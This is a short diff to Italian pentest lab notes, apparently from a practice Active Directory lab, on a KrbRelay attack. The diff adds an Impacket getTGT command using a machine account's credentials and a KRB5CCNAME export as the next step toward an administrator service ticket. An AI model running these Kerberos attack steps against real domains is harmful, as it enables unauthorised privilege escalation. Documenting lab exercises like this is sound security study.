@@ -472,5 +472,9 @@ Lanciamo KrbRelay.exe
 ![[Pasted image 20230906150422.png]]
 Ora usiamo Impacket per ottenere un TGT e poi un ST per l'account da amministratore
 ```bash
+impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPassword'
+export KRB5CCNAME=/workspace/krbrelay\$.ccache   
+```
+```bash
 
 ```
